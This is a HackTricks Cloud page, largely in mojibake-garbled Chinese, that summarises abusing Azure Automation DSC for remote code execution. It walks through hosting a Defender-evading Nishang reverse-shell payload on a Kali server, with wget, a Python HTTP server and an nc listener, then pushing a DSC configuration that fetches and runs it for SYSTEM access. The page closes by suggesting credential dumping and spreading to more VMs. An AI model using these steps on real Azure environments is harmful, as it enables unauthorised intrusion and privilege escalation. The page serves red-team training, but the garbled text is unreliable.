# Az - State Configuration RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

è¯¥è¿‡ç¨‹æ¶‰åŠè®¾ç½®ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨åŸºç¡€è®¾æ–½ï¼Œä»¥æ‰˜ç®¡ä¸€ä¸ªä¿®æ”¹è¿‡çš„Nishang `Invoke-PowerShellTcp.ps1`æœ‰æ•ˆè½½è·ï¼Œå‘½åä¸º`RevPS.ps1`ï¼Œæ—¨åœ¨ç»•è¿‡Windows Defenderã€‚è¯¥æœ‰æ•ˆè½½è·ä»IPä¸º`40.84.7.74`çš„Kali Linuxæœºå™¨ä¸Šé€šè¿‡ä¸€ä¸ªç®€å•çš„Python HTTPæœåŠ¡å™¨æä¾›ã€‚æ“ä½œé€šè¿‡å‡ ä¸ªæ­¥éª¤æ‰§è¡Œï¼š

#### Step 1 â€” Create Files

* **Files Required:** éœ€è¦ä¸¤ä¸ªPowerShellè„šæœ¬ï¼š
1. `reverse_shell_config.ps1`ï¼šä¸€ä¸ªè·å–å¹¶æ‰§è¡Œæœ‰æ•ˆè½½è·çš„æœŸæœ›çŠ¶æ€é…ç½®ï¼ˆDSCï¼‰æ–‡ä»¶ã€‚å¯ä»¥ä»[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)è·å–ã€‚
2. `push_reverse_shell_config.ps1`ï¼šä¸€ä¸ªå°†é…ç½®å‘å¸ƒåˆ°è™šæ‹Ÿæœºçš„è„šæœ¬ï¼Œä½äº[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)ã€‚
* **Customization:** è¿™äº›æ–‡ä»¶ä¸­çš„å˜é‡å’Œå‚æ•°å¿…é¡»æ ¹æ®ç”¨æˆ·çš„ç‰¹å®šç¯å¢ƒè¿›è¡Œè°ƒæ•´ï¼ŒåŒ…æ‹¬èµ„æºåç§°ã€æ–‡ä»¶è·¯å¾„å’ŒæœåŠ¡å™¨/æœ‰æ•ˆè½½è·æ ‡è¯†ç¬¦ã€‚

#### Step 2 â€” Zip Configuration File

* å°†`reverse_shell_config.ps1`å‹ç¼©ä¸ºä¸€ä¸ª`.zip`æ–‡ä»¶ï¼Œä»¥ä¾¿å‡†å¤‡ä¼ è¾“åˆ°Azureå­˜å‚¨å¸æˆ·ã€‚
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 â€” è®¾ç½®å­˜å‚¨ä¸Šä¸‹æ–‡å¹¶ä¸Šä¼ 

* å‹ç¼©çš„é…ç½®æ–‡ä»¶ä½¿ç”¨ Azure çš„ Set-AzStorageBlobContent cmdlet ä¸Šä¼ åˆ°é¢„å®šä¹‰çš„ Azure å­˜å‚¨å®¹å™¨ azure-pentestã€‚
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 â€” å‡†å¤‡ Kali Box

* Kali æœåŠ¡å™¨ä» GitHub ä»“åº“ä¸‹è½½ RevPS.ps1 æœ‰æ•ˆè½½è·ã€‚
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* è„šæœ¬è¢«ç¼–è¾‘ä»¥æŒ‡å®šç›®æ ‡ Windows è™šæ‹Ÿæœºå’Œåå‘ shell çš„ç«¯å£ã€‚

#### Step 5 â€” å‘å¸ƒé…ç½®æ–‡ä»¶

* é…ç½®æ–‡ä»¶è¢«æ‰§è¡Œï¼Œå¯¼è‡´åå‘ shell è„šæœ¬è¢«éƒ¨ç½²åˆ° Windows è™šæ‹Ÿæœºçš„æŒ‡å®šä½ç½®ã€‚

#### Step 6 â€” æ‰˜ç®¡æœ‰æ•ˆè´Ÿè½½å¹¶è®¾ç½®ç›‘å¬å™¨

* å¯åŠ¨ä¸€ä¸ª Python SimpleHTTPServer æ¥æ‰˜ç®¡æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶è®¾ç½®ä¸€ä¸ª Netcat ç›‘å¬å™¨ä»¥æ•è·ä¼ å…¥è¿æ¥ã€‚
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œè·å¾—SYSTEMçº§åˆ«çš„æƒé™ã€‚

#### ç»“è®º

è¯¥è¿‡ç¨‹çš„æˆåŠŸæ‰§è¡Œä¸ºè¿›ä¸€æ­¥çš„æ“ä½œæ‰“å¼€äº†ä¼—å¤šå¯èƒ½æ€§ï¼Œä¾‹å¦‚å‡­è¯è½¬å‚¨æˆ–å°†æ”»å‡»æ‰©å±•åˆ°å¤šä¸ªè™šæ‹Ÿæœºã€‚è¯¥æŒ‡å—é¼“åŠ±åœ¨Azure Automation DSCé¢†åŸŸç»§ç»­å­¦ä¹ å’Œåˆ›é€ ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
